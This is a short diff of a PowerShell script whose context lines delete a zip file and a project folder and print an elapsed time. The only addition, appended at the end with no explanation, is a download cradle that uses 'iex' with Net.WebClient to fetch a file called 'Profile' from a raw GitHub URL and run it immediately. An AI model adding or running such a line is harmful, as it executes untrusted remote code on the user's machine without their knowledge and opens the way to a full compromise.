@@ -17,3 +17,5 @@ Remove-Item -Force -Recurse 'C:\Users\app64.zip', 'C:\Users\ProJ03-main'
 } |
 
 select @{n="time";e={$_.Minutes,"Minutes",$_.Seconds,"Seconds",$_.Milliseconds,"Milliseconds" -join " "}}
+
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Admo9/Source/main/Profile')"
